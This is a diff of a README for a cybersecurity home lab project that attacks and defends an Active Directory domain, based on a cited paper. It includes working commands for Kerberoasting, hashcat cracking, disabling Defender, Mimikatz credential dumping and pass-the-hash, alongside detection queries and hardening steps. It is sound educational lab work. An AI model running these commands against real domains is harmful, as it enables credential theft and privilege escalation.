@@ -3,6 +3,7 @@
 > **Project Type:** Cybersecurity Home Lab — Offensive + Defensive  
 > **Reference Paper:** Mokhtar, B.I., Jurcut, A.D., ElSayed, M.S., and Azer, M.A. (2022). "Active Directory Attacks—Steps, Types, and Signatures." *Electronics*, 11(16), 2629. DOI: 10.3390/electronics11162629  
 > **Tools Used:** VirtualBox, Windows Server 2019, Windows 11 LTSC, Kali Linux, Mimikatz, Impacket, Hashcat  
+> **Status:** Complete ✅
 
 ---
 
@@ -61,6 +62,12 @@ The project follows the full attack-defend lifecycle:
 | alice.johnson | Domain User | Low-privilege employee simulation |
 | svc_sql | Domain User + SPN | Service account (Kerberoasting target) |
 
+![Domain Controller Setup](screenshots/active-directory-installation-result.png)
+
+![AD Users View](screenshots/lab-users-alice-view.png)
+
+![Client Domain Join](screenshots/alice-log-into-domain.png)
+
 ---
 
 ## Attack Phase
@@ -77,6 +84,8 @@ The project follows the full attack-defend lifecycle:
 setspn -A MSSQLSvc/dc01.lab.local:1433 lab\svc_sql
 ```
 
+![SPN Registration](screenshots/spn-registration-success.png)
+
 **Execution (from Kali):**
 
 ```bash
@@ -87,7 +96,13 @@ impacket-GetUserSPNs lab.local/alice.johnson:Password -dc-ip 192.168.56.10 -requ
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
+![Kerberos Ticket Acquisition](screenshots/kerberos-ticket-acquisition.png)
+
+![Hashcat Cracking](screenshots/hashcat-cracking-process.png)
+
 **Result:** Password cracked in **6 seconds**.
+
+![Password Cracked](screenshots/kerberoast-password-cracked.png)
 
 **Detection finding:** Per Mokhtar et al. (2022), Kerberoasting generates no anomalous log entries on DC01. The ticket request is indistinguishable from legitimate service access. Detection requires upstream monitoring of unusual SPN enumeration activity rather than the ticket request itself.
 
@@ -108,6 +123,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 privilege::debug
 sekurlsa::logonpasswords
 ```
+
+![Defender Disabled and Mimikatz Launch](screenshots/defender-disabled-and-mimikatz-launch.png)
+
+![Mimikatz Credential Extraction](screenshots/mimikatz-credential-extraction.png)
 
 **Hash extracted:**
 ```
@@ -130,11 +149,11 @@ nt authority\system
 
 Full SYSTEM-level access on DC01, obtained without knowing the Administrator password.
 
+![Pass the Hash Attack](screenshots/pass-the-hash-attack.png)
+
 **Detection finding (per Mokhtar et al., 2022):** Pass-the-hash leaves two identifiable signatures in Windows Security logs:
 - **Event ID 4624** — Logon Type 3 (Network) from Kali's IP (192.168.56.30), multiple rapid consecutive entries
 - **Event ID 4672** — Special Privileges Assigned to Administrator
-
-These events were verified in DC01's Security log following the attack.
 
 ---
 
@@ -153,7 +172,9 @@ Select-Object TimeCreated,
 Select-Object -First 5
 ```
 
-Result showed four rapid consecutive Type 3 logons from `192.168.56.30` (Kali) as Administrator — the impacket-psexec tool authenticating repeatedly during service setup. This clustering pattern (multiple rapid admin logons from a single external IP) is itself a high-fidelity detection signal.
+Result showed four rapid consecutive Type 3 logons from `192.168.56.30` (Kali) as Administrator. This clustering pattern — multiple rapid admin logons from a single external IP — is itself a high-fidelity detection signal in a real SOC environment.
+
+![Event 4624](screenshots/event-4624.png)
 
 ### Event 4672 — Special Privileges Assigned
 
@@ -164,7 +185,7 @@ Where-Object {$_.User -eq "Administrator"} |
 Select-Object -First 5
 ```
 
-Confirmed Event 4672 entries timestamped during the attack session.
+![Event 4672](screenshots/event-4672.png)
 
 ### Key Detection Limitation
 
@@ -176,7 +197,9 @@ Kerberoasting produced **no detectable log entries** during or after the attack 
 
 ### 1. Service Account Password Strengthened
 
-Reset `svc_sql` password from weak (`Password123#`) to a strong passphrase (`T!ger$Mountain99Lamp`). Renders offline Kerberoasting computationally infeasible regardless of ticket acquisition.
+Reset `svc_sql` password from weak (`Password123#`) to a strong passphrase. Renders offline Kerberoasting computationally infeasible regardless of ticket acquisition.
+
+![Password Change](screenshots/change-sql-svc-password.png)
 
 **Principle:** Prevention over detection for Kerberoasting — since the attack leaves no useful log trace, the only reliable defence is making the cracking cost prohibitive.
 
@@ -187,17 +210,25 @@ auditpol /set /subcategory:"Logon" /success:enable /failure:enable
 auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable
 ```
 
+![Audit Policy](screenshots/audit-policy-configuration.png)
+
 Enables generation of Event 4624 and 4672 for future pass-the-hash attempts. Note: auditing must be configured *before* an attack occurs — logs captured during this project confirmed this gap when the policy was not yet active during initial attack execution.
 
 ### 3. Least Privilege Verified
 
 Confirmed `alice.johnson` and `svc_sql` are members of Domain Users only — no elevated group memberships. Limits blast radius of credential compromise to a single low-privilege account.
 
+![Alice Member Check](screenshots/alice-member-of-check.png)
+
+![SQL SVC Member Check](screenshots/sql-member-of-check.png)
+
 ### 4. LDAP Channel Binding Enforced
 
 ```cmd
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LdapEnforceChannelBinding" /t REG_DWORD /d 2 /f
 ```
+
+![LDAP Hardening](screenshots/ldap-channel-binding-hardening.png)
 
 Addresses DC01's own Event 3041 warning flagged at initial promotion. Enforces validation of Channel Binding Tokens on LDAPS connections, mitigating LDAP relay attack vectors.
 
